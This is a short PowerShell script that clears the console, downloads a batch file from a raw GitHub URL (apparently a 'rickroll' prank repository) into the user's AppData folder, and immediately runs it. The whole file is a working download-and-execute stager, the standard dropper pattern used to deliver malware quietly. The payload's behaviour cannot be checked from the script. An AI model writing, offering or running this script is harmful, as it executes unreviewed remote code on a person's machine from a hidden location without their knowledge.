$ProcName = "bat.bat"
$WebFile = "https://raw.githubusercontent.com/Dharkboi/rickroll.bat/main/$ProcName"
 
Clear-Host
 
(New-Object System.Net.WebClient).DownloadFile($WebFile,"$env:APPDATA\$ProcName")
Start-Process ("$env:APPDATA\$ProcName")
